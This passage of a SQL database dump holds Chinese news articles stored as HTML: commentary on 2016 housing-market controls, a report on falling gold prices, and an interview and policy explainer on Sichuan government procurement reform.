两年来，中央民族工作会议精神在各地生根发芽、开花结果。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('131', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/101353469a1k.jpg\" title=\"3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg\" alt=\"3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">今年的国庆节注定是个不平凡的节日，北京、广州、深圳、苏州、合肥等20个一二线城市相继出台楼市限购限贷政策，“深八条”、“沪六条”等严厉调控措施相继出笼，犹豫在中国大地上引爆了无数颗原子弹，看得人眼花缭乱、心惊肉跳，让人感受到了中国楼市调控“变脸术”之快、之严。&nbsp;</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">社会各界姑且会猜测，这些调控措施付诸实施之后能否成为医治楼市癫狂的灵丹妙药？房地产业服了这些调控药之后是否能走上理性、健康发展轨道？中国民众是否从此不再有楼市猛涨带来的恐慌之虞？回答无疑是否定的。因为这些调控之“药”依然没有摆脱行政窠臼，其结局也就很难跳出行政调控怪圈：“严格管制房价暂时趋缓—放松管制房价暴涨”。也就是说，出台调控措施的这些城市，楼市价格上涨趋势可能暂时会缓一缓，但过后可能又将迎来新一轮量价齐涨周期。因为中国从2005年3月底的“国八条”算起，短短十年间，中国房地产市场虽经历过无数次调控，无论是国务院的各项“通知”，还是九部委、七部委的各种“意见”，都没能阻挡住房价上涨的步伐；不少城市的房价比2005年翻了几番甚至十番都不止。每一轮调控政策都是为稳定住房价格，但调控过后，总有一轮快速上涨行情，越让普通百姓感叹房子越来越买不起了。显然，目前楼市调控实质已陷入越调越高和政府“助涨”的尴尬局面。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这是为什么呢？道理其实很简单，因为我们楼市调控政策存在严重问题：一是没有理顺楼市调控的目的到底是什么，是控制住房价让老百姓买得起房，还是不要过于严厉让房地产开发商能有钱赚和地方财政有收入可进？正因为楼市调控政策总是处于摇摆不定状态，忽而严厉、忽而放松，缺乏长久可持续调控政策措施，让房地产开发商及各级地方政府形成了“耐药性”，使调控功效被抵消。二是没有割断地方政府与房地产业发展之间的各种利益关系，是让楼市调控步入市场运行机制、让市场充分发挥自发调节作用，还是继续伸出行政权力之手来生硬地管制房价或分割利益？由于这种利益关系没理顺，使一些地方政府难下决心认真调控，致使调控政策得不到认真落实走形变样；同时也会更加诱发一些地方政府竭力追求土地财政、推高房价获得足够收入搞高楼房、宽马路等城市形象政绩工程建设，使调控陷入了“死胡同”。三是没有足够底牌或也不愿意拿出有效手段来对冲楼市上涨带来的压力，使楼市调控政策软弱无力。比如保障房、经济适用房等建设速度缓慢、数量严重短缺，把一大批城市中低收入人群也逼向商品房购买行列，更加剧了楼市非理性上涨；也让政府对楼市非正常上涨现象缺乏必要平抑措施，只能望楼市价格上涨兴叹。四是对楼市上涨失控城市政府调控不力、楼市中存在各种违规行为及投机炒作行为缺乏必要法治惩治手段，使楼市失常状况难得到及时扭转。如调控政策出台之后，没有一个地方政府领导因楼市调控措施落实不力受到严肃问责，丢下官帽；没有一个开发商因弄虚作假、违规开发而被罚得倾家荡产；更没有一个楼市投机炒作者被追究刑责入狱。于是地方政府调控措施执行不力已司空见惯，开发商违规行为让人熟视无睹，投机商哄抬房价打乱楼市现象更是让人见怪不怪。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">由此，目前中国一二线城市楼市调控政策不能只求一时轰动效应，而应把追求实实在在的长久调控效果放在首位，推动楼市调控彻底走出“屡涨屡调，屡调屡涨”怪圈：首先，制定富有弹性的楼市调控政策，确立楼市调控近期目标、中期目标和长远目标，分阶段实施，消除狂风暴雨式调控模式；把楼市调控政策制定要交给各级地方政府，建立目标考核责任制，将其纳入施政目标，让民众来打分评价，对民众不满意或房价涨幅过大的地方政府领导实施行政降级、行政记过、诫勉谈话等问责处罚，增强楼市调控政策的严肃性。其次，进一步厘清行政干预与市场调节的界限，确立地方政府在房地产市场中的责任；将房地产市场纳入法治监管轨道，对楼市调控不力的地方政府、违法违规的房地产开发及哄抬房价扰乱楼市秩序的投机商追究刑事责任，增强楼市调控的法治威慑力。再次，应尽快终结土地财政，加快税收制度改革步伐，将中央政府与地方政府事权与财权改革到位，消除地方政府对土地财政的依赖，楼市疯狂暴涨和挤泡沫才真正有希望。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('132', '<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10135526bcqb.jpg\" title=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\" alt=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">三年前，中国大妈们抢购黄金的记忆还历历在目，没想到如今的黄金又开始了一轮又一轮的下跌。接连的破位下跌，再次有人开始蠢蠢欲动，想着投资抄底，再加上中国房地产市场的调控力度不断加大，那么会不会有一部分投资热钱也会进入到黄金市场呢？其实，投资市场历来有句名言是买涨不买跌。不过，对于黄金这种相对常见的避险投资工具来说，很多人买了就是资产配置和“囤货”，并不是简单的投资或者快速的出手，她们持有的耐心和时间更长，因此任何一个低价的出现，都有可能成为触发市场投资的一种诱惑。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">连续下跌，何时是个头？</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">今年的“十一黄金周”期间，黄金价格已经跌破1,300美元/盎司的重要支撑。10月1日～7日，纽约商业交易所（COMEX）黄金大跌4.5%，创下一年来最大单周跌幅，其中上周二跌幅超过3.3%，也创下了2013年12月以来单日最大跌幅。10月4日，现货金价一度跌破1270美元/盎司关口，白银一度跌破18美元关口，跌幅超过5%，多次刷新英国脱欧公投以来最低。市场对欧佩克限产协议不断炒作，原油看涨情绪升温。这都使黄金的价格不被看好。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">市场对全球央行货币政策转向，担忧流动性逆转是黄金下跌的主要原因。其实在8月份之后，全球资本市场人士普遍猜测，各国将统一行动，主要在结构性改革、财政政策上发力，货币政策可能接近极限，全球的流动性将很快出现逆转。黄金价格的剧烈波动，就是对这一猜测的又一次市场反应。如果全球货币宽松走到尽头，那么利率将缓慢上升，全球的债券牛市也将终结。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">摩根大通统计的数据显示，今年英国退欧公投后，欧英日三大央行的季度资产购买规模连创新高。目前美欧英日四大央行的资产负债表已高达13万亿美元之巨，已占全球GDP的40%。预计在今年最后一个季度，欧英日三大央行将“加印”5060亿美元在市场上购买资产，创2009年美联储首推QE以来的最大季度规模。高盛表示，基于全球经济增长仍面临持续下行风险，同时市场可能仍在质疑货币政策应对任何经济潜在冲击的能力。因此，金价跌破每盎司1250美元可能是一个战略性的购买机会。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">值得关注的是，中国央行一直是购买黄金的主力。最新数据显示，截至9月末，国内黄金储备从2014年6月的1054.1吨大幅增加74%至1838.53吨。据中国黄金协会报导，2015年中国生产黄金515.88吨，黄金产量连续九年保持世界第一，黄金消费量连续三年保持世界第一。今年有望继续保持这一势头。不过，今年的黄金需求较往年有明显的回落。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">来自Wind数据统计显示，目前，共有4家拥有黄金业务的上市公司发布了公司的前三季度业绩预报，而从预报结果来看，金价的变化，让这些公司的投资者暂时松了口气。“预计前三季度归属于上市公司股东的净利润变动幅度为增长350.00%至400.00%；同期归属于上市公司股东的净利润变动区间为9847.85万元至10942.05万元；业绩变动的原因是成本下降，黄金价格上升。”</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('142', '<p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">3年，1095天，四川政府采购大步向前：建章立制——搭建起制度框架；扩面增量——夯实政采地基；强化监管——为日常工作立柱架梁。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">2014年以来，四川政府采购的改革创新成果，体现在一个个具体的数字上。而数字的背后，是四川政府采购工作的3年改革答卷——阳光透明，物有所值。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">□子融</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">省财政厅负责人谈政府采购</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：怎样评价我省近年来政府采购改革？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：近年来，我省政府采购法制体系已经基本建立，国家和地方出台的70多项制度构成了四川特色的制度体系。2015年，政府采购规模（财政部口径）达到1376亿元，已经居于全国第四位，2016年又突破2000亿元。依法监管、规范采购、公平竞争、诚信履约的政府采购运行机制显著改善。政府购买服务、PPP项目采购、批量集中采购、全面创新改革、简政放权、公共资源交易改革等各类改革快速推进。政府采购环境大幅改善，社会对政府采购的认可度明显提高。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">特别是在建章立制方面，我省率先在全国取消通用货物协议供货，推行网上竞价和商场（城）直购采购制度，有力遏制通用货物采购质次价高问题；建立采购项目需求论证和履约验收机制，全面落实采购人主体责任；建立政府采购当事人诚信管理机制和行贿犯罪记录查询机制，全面推进诚信体系建设；建立采购需求、评审评分情况、履约验收、绩效评价、质疑答复等关键信息全面公开机制，实现真正阳光采购；建立“三位一体”监督检查、考核和绩效评价机制，多维度考验政府采购执行等，皆走在全国的前列或为首创。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：当前政府采购监管面临怎样的形势？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：随着经济社会发展方式转变，政府采购监管所面临的形势也发生变化。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">一是经济发展方式转变对政府采购机制提出新要求。党的十八届五中全会提出创新、协调、绿色、开放、共享“五大发展理念”。政府采购制度作为政府调控经济、促进经济社会发展的重要政策工具，须不断改革创新。这要求我们要积极发挥政府采购政策作用，服务我省经济社会发展。去年以来，我省为推进“全面创新改革”，建立了促进中小企业发展和创新产品远期约定政府购买两项制度，就是政府采购政策服务于发展大局的重要体现。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">二是政府市场关系定位对政府采购管理提出新要求。党的十八届三中全会提出,要处理好政府和市场的关系，使市场在资源配置中起决定性作用。政府采购一头连接政府，一头连接市场，我们要按照“三公一诚信”的基本原则,更好发挥“裁判员”作用，制定和落实好比赛规则,维护好公平公正的市场秩序。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">三是依法治国法治理念对政府采购运行提出新要求。党的十八届四中全会提出，建设中国特色社会主义法治体系。这使得增强政府采购法制在采购活动中的约束力的要求更加明确。政府采购要防止权力干预、权力滥用，增强政府采购法制的约束力；要管住政府采购中想乱伸的权力之手，这就要求我们在工作中发挥各方面的监督制约机制，将内部监督、法定监督和社会监督相结合。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">财政部门作为政府采购制度改革的主导者、操刀人，要努力在构建规范透明、公平竞争、监督到位、严格问责的工作机制方面下功夫。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">四是全面深化改革任务对政府采购监督提出新要求。政府采购制度改革作为财政支出改革“三驾马车”之一，已进入全面深化改革的新阶段，啃硬骨头、趟深水区的事情会越来越多。这要求我们积极发挥公共财政管理综合职能；发挥政府采购监督合力，要与监察、审计等监督部门建立联合监督工作机制；发挥第三方社会监督作用，用社会的力量促进政府采购良性发展。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：政府采购改革需要把握哪些重点？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：当前,我省各项改革快速推进,政府采购改革要顺应这种变化，重点要把握好以下三方面关系。一是把握好依法行政和加强服务意识的关系，坚持“法定职责必须为、法无授权不可为”。二是把握好简政放权和加强监督管理的关系，坚持“抓大放小，有所为有所不为”。三是把握好基础工作和加强改革创新的关系，要“干好基础工作，不断推陈出新”。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：为加强政府采购监管，省财政厅下一步将有哪些打算？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：一是认真贯彻落实现有的政府采购法律制度，并在实践中不断创新完善。二是切实加强采购人、采购代理机构内部控制管理制度建设。三是积极深入推进政府采购信息化建设。将政府采购信息化建设工作纳入财政信息化建设的总体部署,进一步加强政府采购管理交易系统与部门预算、国库集中支付、资产管理等信息系统的衔接贯通。四是大力支持公共资源交易平台整合。按照国务院方案、14部委39号令、财政部的规定,落实好依法恢复集中采购机构的独立法人地位、积极参与制定本地区公共资源交易平台整合的具体实施方案、统一政府采购交易规则体系等工作要求。五是着力加强政府采购事中事后监管。六是着力加强政府采购机构队伍建设。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">政府采购政策解读</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：是不是公开招标才叫政府采购？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：不是。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政策解读：公开招标与政府采购不是同一概念，公开招标只是政府采购方式之一。一个采购项目究竟适用于哪种采购方式，应当根据采购项目的具体需求和特点来定，不能一概而论。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">不同的采购方式，需要的时间不一。从发布采购公告到可以签订政府采购合同所需法定时间计算，公开招标约28天；邀请招标约34天；竞争性谈判约13天；竞争性磋商约18天；询价约13天；单一来源采购没有明确的时间限制，一般情况约7天。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：国有企业采购是政府采购吗？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：不是。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政策解读：根据《政府采购法》的规定，政府采购是指各级国家机关、事业单位和团体组织，使用财政性资金采购依法制定的集中采购目录以内的或者采购限额标准以上的货物、工程和服务的行为。一个采购项目，必须采购主体、采购资金、采购范围、采购对象同时符合有关规定，才纳入政府采购管理。我国政府采购的主体是各级国家机关、事业单位和团体组织。因此，任何组织形式的企业采购都不属于政府采购范畴。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：政府采购的资金是财政性资金，是不是就是财政拨款的资金？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：不是。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政策解读：根据《政府采购法实施条例》的规定，财政性资金是指纳入预算管理的资金。因此，不能将财政性资金等同于财政拨款的资金，财政性资金的范围要比财政拨款资金的范围大得多。比如，医院医疗收费、学校教育收费及其他事业单位的收费，都是纳入预算管理的，都属于政府采购财政性资金的范畴，这些资金就不是财政拨款资金。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：采购人在政府采购中是何种角色？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：是名副其实的“主角”。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政策解读：采购人是政府采购活动中的主体，是名副其实的主角。按照《政府采购法》及其实施条例、《党政机关厉行节约反对浪费条例》、《中华人民共和国政府信息公开条例》等法规，明确了采购人在采购需求制定、履约情况验收、内控机制建设、政策的落实、采购信息公开五个方面的主体责任。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：分散采购，就是单位自行随意采购吗？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：不是。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政策解读：分散采购也是政府采购，应当按照《政府采购法》规定的方式和程序执行。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">此外，政府采购中的自行采购，指的是采购人按照政府采购有关规定，自行组织采购，并不是自行随意购买。自行组织采购，通俗地说，就是采购单位既要干采购人的活，又要干采购代理机构的活，两个活，一肩挑。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：政府采购可优先采购本地企业产品吗？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：不可以。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政策解读：政府采购市场是全国统一自由市场，阻挠和限制供应商自由进入本地区和本行业政府采购市场的行为是违法的。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政府采购应当有助于实现国家的经济和社会发展政策目标，政府采购政策包含多方面内容，其功能主要包括节约能源、保护环境、扶持不发达地区和少数民族地区、促进中小企业发展以及采购本国货物、工程和服务等。目前，没有优先采购本地企业产品这类政策。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">问：政府采购只受财政部门的监督吗？</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">答：不是。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">政策解读：除了财政部门，监察机关和审计部门等依法负有行政监督职责的政府有关部门也是政府采购监督部门。按照《政府采购法》规定，各级人民政府财政部门是负责政府采购监督管理的部门，依法履行对政府采购活动的监督管理职责；各级人民政府其他有关部门依法履行与政府采购活动有关的监督管理职责。审计机关对政府采购进行审计监督，监察机关对参与政府采购活动的有关人员实施监察监督，总的来说就是各部门依据各自法定职责对政府采购中的“人”“财”“事”进行监督。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">26项制度</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　扎紧政策笼子</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">在国务院《政府采购法实施条例》、财政部《政府采购非招标采购方式管理办法》等法规制度的基础上，通过连续3年系统性建章立制，我省政府采购已构建起比较健全完善的政府采购制度体系，基本做到了事事有法可依、有章可循，进一步扎紧了制度的笼子。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">3年来，我省共计制定出台了《关于创新政府采购机制 加强政府采购监管工作的意见》《关于贯彻落实&lt;中华人民共和国政府采购法实施条例&gt;的若干规定》《四川省政府采购当事人诚信管理办法》《四川省政府采购项目需求论证和履约验收管理办法》《四川省政府采购促进中小企业发展的若干规定》等26项制度。<!--中华人民共和国政府采购法实施条例--></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">同时，结合“放管服”改革要求，主要厘清财政部门、采购单位、采购代理机构和评审专家在政府采购活动中的职责和义务，提出加强采购单位和采购代理机构内部控制管理的指导意见，做到权责清晰。明确政府采购计划备案、采购需求论证、采购文件编制、采购评审、履约验收、采购方式变更和进口产品审核等采购重点环节的执行要求，简化审核流程。建立对采购代理机构监督检查和考核、政府采购项目绩效评价等事后监督机制，强化事后监管。按照全面创新改革要求，为落实创新产品采购和促进中小企业发展等政府采购政策提供有力的制度保障。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">充分尊重和发挥了市场对资源配置的决定性作用，转变了围绕规范采购程序进行制度设计的传统思维,以有利于结果导向进行制度重构，注重政府采购透明度建设，引入第三方监督机制，推行法定监督和社会监督相结合的监督模式，使制度在实践中得到了良好的执行。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">突破2000亿元</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　采购规模快速增长</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">2016年我省政府采购规模达到2009.1亿元，较2015年增加632.6亿元，增长46%；较2013年增加1671.1亿元，同比增长208.7%，年均增幅达45.6%，占公共财政支出的比重较2013年提高19.9个百分点。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">3年来，我省政府采购改革逐步推进，范围不断扩大，同时各级财政部门严格执行“无预算、无计划、不采购”的原则，通过强化政府采购预算审查，推行政府采购计划备案管理，加强宣传培训，积极纠错纠偏，采购单位的政府采购意识不断提高，政府采购规模实现快速增长。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">资金节约率33.2%</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">我省从2015年正式推行批量集中采购，采购规模不断增加，采购单位不断增多，规模效应的优势凸显。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">据统计，2016年全省批量集中采购2.5亿元，资金节约率为33.2%；其中，省级批量集中采购3954万元，资金节约率达62.7%，执行批量集中采购的单位84家，较2015年增加16家。执行批量集中采购的产品价格普遍低于同期市场价格20%左右，个别项目甚至近50%。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">实践证明，批量集中采购是一种既能充分体现政府集中采购规模效应，又能让采购人普遍接受的一种创新方式。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　进口产品审核减少77项</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　简政放权 审核事项递减</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">进口商品采购方面，省级和部分市（州）已经推行进口产品“清单制”，单位采购清单内进口产品无需再单独向财政部门申请。据了解，有很多市县直接参照省级的做法和清单范围，在本地推行，这些做法，大大简化了审核程序，提高了采购效率。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">以省级为例，2016年，省财政厅审核进口产品148项，较2015年同期减少77项。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">简政放权对发挥政府采购政策作用、降低创新风险、激发创新活力、促进中小企业发展有着积极的作用。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　No.1</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　政府采购透明度四川最优</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">2016年11月1日，国家智库——中国社科院发布中国首个《政府采购透明度评估报告(2016)》。《评估报告》反映，我省批量集中采购模式得分为90.4分、投诉处理结果及违规处罚结果得分为100分，总分为92.15分。四川省级政府采购透明度全国第一。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">点睛</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \">3年来，采购人、采购代理机构、评审专家、供应商等政府采购活动的当事人和参与者，对于政府采购的评价也在逐渐发生变化。以前常听到的“质次价高”“效率低”这样的话，现在已经少有负面的评价。这些现象说明政府采购环境在向好的方面发展。</p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">3669个项目</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　接受监督检查</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 0px; font-size: 18px; text-indent: 2em; font-stretch: normal; line-height: 32px; font-family: \"><strong style=\"margin: 0px; padding: 0px;\">　　规模和质量全国领先</strong></p><p style=\"margin-top: 32px; margin-bottom: 0px; padding: 